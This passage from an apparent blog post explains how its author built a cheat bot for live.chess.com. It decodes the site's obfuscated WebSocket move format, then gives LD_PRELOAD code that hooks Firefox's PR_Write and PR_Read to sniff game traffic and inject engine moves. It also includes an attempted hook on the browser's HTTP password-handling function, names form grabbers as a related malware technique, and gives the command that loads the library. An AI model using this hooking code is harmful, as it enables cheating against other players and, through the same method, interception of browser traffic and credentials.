            <span class="n">var</span> <span class="n">z2b70d</span> <span class="o">=</span> <span class="n">ze2e37</span><span class="p">.</span><span class="n">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
            <span class="n">var</span> <span class="n">z5b3be</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">z98075</span> <span class="o">==</span> <span class="n">this</span><span class="p">.</span><span class="n">z56f6c</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">z5b3be</span> <span class="o">=</span> <span class="n">z2b70d</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
                <span class="n">z2ba00</span> <span class="o">=</span> <span class="s">&quot;q&quot;</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> 
            <span class="k">if</span> <span class="p">(</span><span class="n">z98075</span> <span class="o">==</span> <span class="n">this</span><span class="p">.</span><span class="n">z87e36</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">z5b3be</span> <span class="o">=</span> <span class="n">z2b70d</span><span class="p">;</span>
                <span class="n">z2ba00</span> <span class="o">=</span> <span class="s">&quot;q&quot;</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> 
            <span class="k">if</span> <span class="p">(</span><span class="n">z98075</span> <span class="o">==</span> <span class="n">this</span><span class="p">.</span><span class="n">zbba2c</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">z5b3be</span> <span class="o">=</span> <span class="n">z2b70d</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
                <span class="n">z2ba00</span> <span class="o">=</span> <span class="s">&quot;q&quot;</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> 
            <span class="k">if</span> <span class="p">(</span><span class="n">z98075</span> <span class="o">==</span> <span class="n">this</span><span class="p">.</span><span class="n">z7fd23</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">z5b3be</span> <span class="o">=</span> <span class="n">z2b70d</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
                <span class="n">z2ba00</span> <span class="o">=</span> <span class="s">&quot;n&quot;</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> 
            <span class="k">if</span> <span class="p">(</span><span class="n">z98075</span> <span class="o">==</span> <span class="n">this</span><span class="p">.</span><span class="n">za93ff</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">z5b3be</span> <span class="o">=</span> <span class="n">z2b70d</span><span class="p">;</span>
                <span class="n">z2ba00</span> <span class="o">=</span> <span class="s">&quot;n&quot;</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> 
            <span class="k">if</span> <span class="p">(</span><span class="n">z98075</span> <span class="o">==</span> <span class="n">this</span><span class="p">.</span><span class="n">z536e1</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">z5b3be</span> <span class="o">=</span> <span class="n">z2b70d</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
                <span class="n">z2ba00</span> <span class="o">=</span> <span class="s">&quot;n&quot;</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> 
            <span class="k">if</span> <span class="p">(</span><span class="n">z98075</span> <span class="o">==</span> <span class="n">this</span><span class="p">.</span><span class="n">z817b2</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">z5b3be</span> <span class="o">=</span> <span class="n">z2b70d</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
                <span class="n">z2ba00</span> <span class="o">=</span> <span class="s">&quot;r&quot;</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> 
            <span class="k">if</span> <span class="p">(</span><span class="n">z98075</span> <span class="o">==</span> <span class="n">this</span><span class="p">.</span><span class="n">z00e3d</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">z5b3be</span> <span class="o">=</span> <span class="n">z2b70d</span><span class="p">;</span>
                <span class="n">z2ba00</span> <span class="o">=</span> <span class="s">&quot;r&quot;</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> 
            <span class="k">if</span> <span class="p">(</span><span class="n">z98075</span> <span class="o">==</span> <span class="n">this</span><span class="p">.</span><span class="n">ze4b5e</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">z5b3be</span> <span class="o">=</span> <span class="n">z2b70d</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
                <span class="n">z2ba00</span> <span class="o">=</span> <span class="s">&quot;r&quot;</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> 
            <span class="k">if</span> <span class="p">(</span><span class="n">z98075</span> <span class="o">==</span> <span class="n">this</span><span class="p">.</span><span class="n">z91a79</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">z5b3be</span> <span class="o">=</span> <span class="n">z2b70d</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
                <span class="n">z2ba00</span> <span class="o">=</span> <span class="s">&quot;b&quot;</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> 
            <span class="k">if</span> <span class="p">(</span><span class="n">z98075</span> <span class="o">==</span> <span class="n">this</span><span class="p">.</span><span class="n">zc21d8</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">z5b3be</span> <span class="o">=</span> <span class="n">z2b70d</span><span class="p">;</span>
                <span class="n">z2ba00</span> <span class="o">=</span> <span class="s">&quot;b&quot;</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> 
            <span class="k">if</span> <span class="p">(</span><span class="n">z98075</span> <span class="o">==</span> <span class="n">this</span><span class="p">.</span><span class="n">zaa236</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">z5b3be</span> <span class="o">=</span> <span class="n">z2b70d</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
                <span class="n">z2ba00</span> <span class="o">=</span> <span class="s">&quot;b&quot;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">z5b3be</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">var</span> <span class="n">zd2788</span> <span class="o">=</span> <span class="n">ze2e37</span><span class="p">.</span><span class="n">charAt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">zd2788</span> <span class="o">==</span> <span class="mi">7</span><span class="p">)</span>
                    <span class="n">zbd29b</span> <span class="o">=</span> <span class="n">String</span><span class="p">.</span><span class="n">fromCharCode</span><span class="p">(</span><span class="n">z5b3be</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;8&quot;</span><span class="p">;</span>
                <span class="k">else</span> 
                <span class="k">if</span> <span class="p">(</span><span class="n">zd2788</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span>
                    <span class="n">zbd29b</span> <span class="o">=</span> <span class="n">String</span><span class="p">.</span><span class="n">fromCharCode</span><span class="p">(</span><span class="n">z5b3be</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;1&quot;</span><span class="p">;</span>
                <span class="k">else</span>
                    <span class="k">return</span> <span class="n">null</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">zbd29b</span> <span class="o">=</span> <span class="n">this</span><span class="p">.</span><span class="n">ze8500</span><span class="p">[</span><span class="s">&quot;_&quot;</span> <span class="o">+</span> <span class="n">z98075</span><span class="p">];</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">zbd29b</span><span class="p">)</span>
                    <span class="k">return</span> <span class="n">null</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">var</span> <span class="n">z3cbd9</span> <span class="o">=</span> <span class="p">{};</span>
            <span class="n">z3cbd9</span><span class="p">[</span><span class="s">&quot;fromArea&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">ze2e37</span><span class="p">;</span>
            <span class="n">z3cbd9</span><span class="p">[</span><span class="s">&quot;toArea&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">zbd29b</span><span class="p">;</span>
            <span class="n">z3cbd9</span><span class="p">[</span><span class="s">&quot;additionalInfo&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">z2ba00</span><span class="p">;</span>
            <span class="k">return</span> <span class="n">z3cbd9</span><span class="p">;</span>
        <span class="p">},</span><span class="nl">za902f</span><span class="p">:</span> <span class="n">function</span><span class="p">(</span><span class="n">zcc2ef</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="n">this</span><span class="p">.</span><span class="n">z6439d</span><span class="p">[</span><span class="n">zcc2ef</span><span class="p">];</span>
        <span class="p">},</span><span class="nl">z398d0</span><span class="p">:</span> <span class="n">function</span><span class="p">(</span><span class="n">zccfb6</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="n">this</span><span class="p">.</span><span class="n">ze8500</span><span class="p">[</span><span class="s">&quot;_&quot;</span> <span class="o">+</span> <span class="n">zccfb6</span><span class="p">];</span>
        <span class="p">}};</span>
<span class="p">})();</span>
</pre></div>


<p>Before I forget it: Why the hell are you guys from chess.com obfuscating
your JS code? I mean it probably makes sense to pack and encrypt game
binaries of big games (that are still very fast cracked by talanted
crackers), but why blur Javascript? It's just too easy to reverse the
logic with existing tools such as DevTools or Firebug, so why even
bother?</p>
<p>No with the function above, we can look the move up which reveals "mC"
== "e3e5". So we now how to encode/decode the move notation. Let's
inspect the next message:</p>
<p><strong>4. Writing my first move (outgoing Message)</strong></p>
<div class="highlight"><pre>[{&quot;channel&quot;:&quot;/service/user&quot;,&quot;data&quot;:{&quot;move&quot;:{&quot;gid&quot;:709341692,&quot;seq&quot;:1,&quot;uid&quot;:&quot;EatingSpiders&quot;,&quot;move&quot;:&quot;YI&quot;,&quot;clock&quot;:600,&quot;clockms&quot;:60000,&quot;squared&quot;:false},&quot;sid&quot;:&quot;gserv&quot;,&quot;tid&quot;:&quot;Move&quot;},&quot;id&quot;:&quot;259&quot;,&quot;clientId&quot;:&quot;6djua267g6n8ydja21m8yhztj3gtpx&quot;}]
</pre></div>


<p>Nothing new here, this is just my browser that send the move "YI" to the
game server. You can look it up now on your own, since I have identified
the decoding mechanism above.</p>
<p>Now the next messages are just essentially like the previous two (with
status <em>in_progress</em> in place of the initial <em>starting</em>), always
receiving the opponents move and then I sending my move. So we have all
knowledge about the protocol that we need, now let's discuss how I
finally implemented my bot.</p>
<h3 id="chap_workings">How the bot is implemented</h3>
<p>As discussed, I chose to hook into low level networking functions in the
browser. I chose firefox as my hooking target, because there already
exist quite many examples on how to hook networking functions in
firefox.</p>
<p>So the technique is basically known as the LD_PRELOAD trick. You can
learn about it on this short <a href="http://stackoverflow.com/questions/426230/what-is-the-ld-preload-trick">stackoverflow.com
explanation</a>.</p>
<p>There are other, better ways to hook library functions, I really
recommend you to read <a href="http://www.codeproject.com/Articles/70302/Redirecting-functions-in-shared-ELF-libraries">this wonderful
article</a>
about <em>redirecting shared functions in ELF binaries</em>. But you should
have profound knowledge of the <em>ELF</em> format in order to follow;</p>
<p>First, I tried to hook directly into the specific HTTP and WebSocket
functions in the firefox network library called <em>netwerk</em> or
<a href="https://developer.mozilla.org/en/docs/Necko">necko</a>. But firefox is
written in C++ and therefore it's not so simple to use the LD_PRELOAD
trick, because the functions/class names are
<a href="http://en.wikipedia.org/wiki/Name_mangling#Standardised_name_mangling_in_C.2B.2B">mangled</a>.
I desperately tried to hook such C++ code and I also managed to to so in
a simple example. It looks something like below, but it couldn't
actually log some calls. Maybe because the function was never called.
Here I try to hook into the <code>GenerateCredentials()</code> function of the
<code>nsHttpBasicAuth</code> class. I assume the function fires when you enter
HttpAuth credentials in a browser.</p>
<div class="highlight"><pre><span class="cp">#include </span>
<span class="cp">#include </span>
<span class="cp">#include </span>
<span class="cp">#include</span>

<span class="cp">#ifndef _GNU_SOURCE</span>
<span class="cp">#define _GNU_SOURCE</span>
<span class="cp">#endif</span>

<span class="n">namespace</span> <span class="n">mozilla</span> <span class="p">{</span>
<span class="n">namespace</span> <span class="n">net</span> <span class="p">{</span>

<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">char16_t</span><span class="p">;</span>
<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="kt">uint32_t</span><span class="p">;</span>
<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">PRUint32</span><span class="p">;</span> 
<span class="k">typedef</span> <span class="n">PRUint32</span> <span class="n">nsresult</span><span class="p">;</span>
<span class="cp">#define NS_IMETHODIMP NS_IMETHODIMP_(nsresult)</span>

<span class="n">class</span> <span class="n">nsIHttpAuthenticator</span> <span class="p">{</span>

<span class="p">};</span>

<span class="n">class</span> <span class="n">nsISupports</span> <span class="p">{</span>

<span class="p">};</span>

<span class="n">class</span> <span class="nl">nsHttpBasicAuth</span> <span class="p">:</span> <span class="n">public</span> <span class="n">nsIHttpAuthenticator</span>
<span class="p">{</span>
<span class="nl">public</span><span class="p">:</span>
    <span class="n">nsHttpBasicAuth</span><span class="p">();</span>
    <span class="n">virtual</span> <span class="o">~</span><span class="n">nsHttpBasicAuth</span><span class="p">();</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">GenerateCredentials</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">authChannel</span><span class="p">,</span>
                                     <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">challenge</span><span class="p">,</span>
                                     <span class="kt">bool</span> <span class="n">isProxyAuth</span><span class="p">,</span>
                                     <span class="k">const</span> <span class="kt">char16_t</span> <span class="o">*</span><span class="n">domain</span><span class="p">,</span>
                                     <span class="k">const</span> <span class="kt">char16_t</span> <span class="o">*</span><span class="n">user</span><span class="p">,</span>
                                     <span class="k">const</span> <span class="kt">char16_t</span> <span class="o">*</span><span class="n">password</span><span class="p">,</span>
                                     <span class="n">nsISupports</span> <span class="o">**</span><span class="n">sessionState</span><span class="p">,</span>
                                     <span class="n">nsISupports</span> <span class="o">**</span><span class="n">continuationState</span><span class="p">,</span>
                                     <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">aFlags</span><span class="p">,</span>
                                     <span class="kt">char</span> <span class="o">**</span><span class="n">creds</span><span class="p">);</span>

<span class="p">};</span>

<span class="n">nsHttpBasicAuth</span><span class="o">::</span><span class="n">nsHttpBasicAuth</span><span class="p">()</span>
<span class="p">{</span>
<span class="p">}</span>

<span class="n">nsHttpBasicAuth</span><span class="o">::~</span><span class="n">nsHttpBasicAuth</span><span class="p">()</span>
<span class="p">{</span>
<span class="p">}</span>

<span class="kt">unsigned</span> <span class="kt">long</span>
<span class="n">nsHttpBasicAuth</span><span class="o">::</span><span class="n">GenerateCredentials</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">authChannel</span><span class="p">,</span>
                                     <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">challenge</span><span class="p">,</span>
                                     <span class="kt">bool</span> <span class="n">isProxyAuth</span><span class="p">,</span>
                                     <span class="k">const</span> <span class="kt">char16_t</span> <span class="o">*</span><span class="n">domain</span><span class="p">,</span>
                                     <span class="k">const</span> <span class="kt">char16_t</span> <span class="o">*</span><span class="n">user</span><span class="p">,</span>
                                     <span class="k">const</span> <span class="kt">char16_t</span> <span class="o">*</span><span class="n">password</span><span class="p">,</span>
                                     <span class="n">nsISupports</span> <span class="o">**</span><span class="n">sessionState</span><span class="p">,</span>
                                     <span class="n">nsISupports</span> <span class="o">**</span><span class="n">continuationState</span><span class="p">,</span>
                                     <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">aFlags</span><span class="p">,</span>
                                     <span class="kt">char</span> <span class="o">**</span><span class="n">creds</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">&quot;[+] GenerateCredentials hooked!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="c1">// define the class member pointer tyep</span>
    <span class="k">typedef</span> <span class="kt">unsigned</span> <span class="nf">long</span> <span class="p">(</span><span class="n">nsHttpBasicAuth</span><span class="o">::*</span><span class="n">hookedMethod</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="kt">bool</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char16_t</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char16_t</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char16_t</span> <span class="o">*</span><span class="p">,</span> <span class="n">nsISupports</span> <span class="o">**</span><span class="p">,</span> <span class="n">nsISupports</span> <span class="o">**</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="p">);</span>
    <span class="k">static</span> <span class="n">hookedMethod</span> <span class="n">origMethod</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">tmpPtr</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">&quot;_ZN7mozilla3net15nsHttpBasicAuth19GenerateCredentialsEPvPKcbPKtS6_S6_PPNS0_11nsISupportsES9_PjPPc&quot;</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">tmpPtr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;dlsym() couldn&#39;t located the symbol :( </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">origMethod</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tmpPtr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tmpPtr</span><span class="p">));</span>

    <span class="c1">// call the original method</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">retVal</span> <span class="o">=</span> <span class="p">(</span><span class="n">this</span><span class="o">-&gt;*</span><span class="n">origMethod</span><span class="p">)(</span><span class="n">authChannel</span><span class="p">,</span> <span class="n">challenge</span><span class="p">,</span> <span class="n">isProxyAuth</span><span class="p">,</span> <span class="n">domain</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">sessionState</span><span class="p">,</span> <span class="n">continuationState</span><span class="p">,</span> <span class="n">aFlags</span><span class="p">,</span> <span class="n">creds</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">retVal</span><span class="p">;</span>
<span class="p">}</span>

<span class="p">}</span>
<span class="p">}</span>
</pre></div>


<p>Anyways, if I could get succeed in hooking C++ functions by overcoming
the mangling issues, I would directly hook into functions found in the
mozilla source tree
<a href="http://mxr.mozilla.org/mozilla-central/source/netwerk/protocol/websocket/">/mozilla-central/source/netwerk/protocol/websocket/</a>.
It would be enormously juicy to hook into the file
<a href="http://mxr.mozilla.org/mozilla-central/source/netwerk/protocol/websocket/WebSocketChannel.cpp">WebSocketChannel.cpp</a>.
For example the function <code>void WebSocketChannel::BeginOpen()</code> on line
1061 looks like a nice start. <strong>Can anyone provide me a hooking example
for this function? That'd be awesome!</strong></p>
<p>So after some further research and giving up trying to hook C++
functions, I decided to hook into firefox's <em>PR_write()</em> and
<em>PR_read()</em> low level networking functions, implemented in plain C. If
you search for these functions in the internet, you will find lot's of
different example for form grabbers, techniques that are commonly used
by maleware writers.</p>
<p>After experimenting a little bit with these two functions, I figured out
that basically the whole freaking internet flows through them. For
instance, if you just open a browser without loading any site, a whole
bunch of meta protocols are squeezed through <em>PR_write()</em> and
<em>PR_read()</em>.</p>
<p>I assume that all possible protocols (like accessing cookies,
<em>about:blank</em>, <em>file:</em> and the like) are also handled these functions.
It's really funny what you're able to see when you hook into these
functions. To formulate it pregnant: Stuff that you thought to be
deleted after clearing the cache is happily appearing inside these two
functions...</p>
<p>Anyways, the basic C code that implements this hooking technique in form
of a shared library looks like the bottom code excerpt. You can always
visit <a href="https://github.com/NikolaiT/chess-com-cheat">my public
repository</a>, where you can
read the current state of the cheat code.</p>
<div class="highlight"><pre><span class="n">PRInt32</span> <span class="nf">PR_Write</span><span class="p">(</span><span class="n">PRFileDesc</span> <span class="o">*</span><span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="n">PRInt32</span> <span class="n">amount</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">static</span> <span class="n">PRInt32</span> <span class="p">(</span><span class="o">*</span><span class="n">my_PR_write</span><span class="p">)(</span><span class="n">PRFileDesc</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="n">PRInt32</span><span class="p">)</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="c1">// Detect the client WebSocket connection attempt</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">webSocketState</span><span class="p">.</span><span class="n">state</span> <span class="o">&amp;</span> <span class="n">WEB_SOCKET_CONNECTION_REQUESTED</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">amount</span> <span class="o">&gt;</span> <span class="mi">600</span> <span class="o">&amp;&amp;</span> <span class="n">amount</span> <span class="o">&lt;</span> <span class="mi">1200</span> <span class="o">&amp;&amp;</span> <span class="n">memContains</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="n">amount</span><span class="p">,</span> <span class="s">&quot;Upgrade: websocket&quot;</span><span class="p">)</span> 
        <span class="o">&amp;&amp;</span> <span class="n">memContains</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="n">amount</span><span class="p">,</span> <span class="s">&quot;Origin: http://live.chess.com&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">memContains</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="n">amount</span><span class="p">,</span> <span class="s">&quot;Sec-WebSocket-Key:&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
             <span class="n">memContains</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="n">amount</span><span class="p">,</span> <span class="s">&quot;Sec-WebSocket-Version: 13&quot;</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">webSocketState</span><span class="p">.</span><span class="n">state</span> <span class="o">|=</span> <span class="n">WEB_SOCKET_CONNECTION_REQUESTED</span><span class="p">;</span> 
<span class="cp">#if DEBUG_LEVEL &gt;= 1</span>
        <span class="n">INFO_PRINT</span><span class="p">(</span><span class="s">&quot;Chess.com WebSocket client request detected&quot;</span><span class="p">,</span> <span class="n">SH_RED</span><span class="p">);</span>
<span class="cp">#endif</span>
        <span class="c1">// Also start up the Stockfish engine</span>
        <span class="c1">//INFO_PRINT(&quot;Starting the engine...&quot;, SH_BLUE);</span>
        <span class="c1">//initStockfish();</span>
    <span class="p">}</span>
    <span class="cm">/*</span>
<span class="cm">     * When the WebSocket is open sniff for move packets that are between 230 and 240 bytes in size.</span>
<span class="cm">     * I observed that these synchronize with moves made and hence I assume these packetses transmit moves.</span>
<span class="cm">     * Now I just need do decrypt them and good is.</span>
<span class="cm">     */</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">webSocketState</span><span class="p">.</span><span class="n">state</span> <span class="o">&amp;</span> <span class="n">WEB_SOCKET_CONNECTION_REQUESTED</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">amount</span> <span class="o">&gt;</span> <span class="mi">210</span> <span class="o">&amp;&amp;</span> <span class="n">amount</span> <span class="o">&lt;</span> <span class="mi">260</span><span class="p">)</span> <span class="p">{</span>
<span class="cp">#if DEBUG_LEVEL &gt;= 2</span>
        <span class="n">INFO_PRINT</span><span class="p">(</span><span class="s">&quot;PR_Write() called and buffer size suggests that this packet represents a move!&quot;</span><span class="p">,</span> <span class="n">SH_RED</span><span class="p">);</span>
<span class="cp">#endif</span>
        <span class="c1">// Inject a engine made move and update the game state</span>
        <span class="n">modifyMove</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">amount</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">my_PR_write</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">&quot;PR_Write&quot;</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">my_PR_write</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;dlsym() failed for PR_Write</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">PRInt32</span> <span class="n">retVal</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">my_PR_write</span><span class="p">)(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">retVal</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">PRInt32</span> <span class="nf">PR_Read</span><span class="p">(</span><span class="n">PRFileDesc</span> <span class="o">*</span><span class="n">fd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="n">PRInt32</span> <span class="n">amount</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">static</span> <span class="n">PRInt32</span> <span class="p">(</span><span class="o">*</span><span class="n">my_PR_read</span><span class="p">)(</span><span class="n">PRFileDesc</span> <span class="o">*</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="n">PRInt32</span><span class="p">);</span>

    <span class="cm">/* </span>
<span class="cm">     * There is a hell of a lot data that passes through this function. Hence we only want</span>
<span class="cm">     * to consume as few as possible processing power. We are only interested in data that</span>
<span class="cm">     * is in a specfic length range, since it seems that the WebSocket packets on live.chess.com</span>
<span class="cm">     * use pretty regular packet size.</span>
<span class="cm">     */</span>

    <span class="cm">/* </span>
<span class="cm">     * Sniff for incoming live.chess.com WebSocket move data.</span>
<span class="cm">     */</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">webSocketState</span><span class="p">.</span><span class="n">state</span> <span class="o">&amp;</span> <span class="n">WEB_SOCKET_CONNECTION_REQUESTED</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">amount</span> <span class="o">&gt;</span> <span class="mi">50</span> <span class="o">&amp;&amp;</span> <span class="n">memContains</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="n">amount</span><span class="p">,</span> <span class="s">&quot;moves&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">couldRead</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="n">collectGameState</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
<span class="cp">#if DEBUG_LEVEL &gt;= 2</span>
        <span class="n">INFO_PRINT</span><span class="p">(</span><span class="s">&quot;PR_Read() called with &#39;moves&#39; keyword inside&quot;</span><span class="p">,</span> <span class="n">SH_BLUE</span><span class="p">);</span>
<span class="cp">#endif</span>
    <span class="p">}</span>

    <span class="n">my_PR_read</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">&quot;PR_Read&quot;</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">my_PR_read</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;dlsym() failed for PR_Write</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">PRInt32</span> <span class="n">retVal</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">my_PR_read</span><span class="p">)(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">retVal</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>I hope the above code is more or less self explanatory. But in case it's
not, here's a short summary of the rough algorithm that it computes:</p>
<p><strong>1.</strong> The shared library (let's call it libpwh.so) is dynamically
loaded in a firefox process with the LD_PRELOAD trick. For instance:
<code>export LD_PRELOAD=$PWD/libpwh.so; /usr/bin/firefox</code><br />
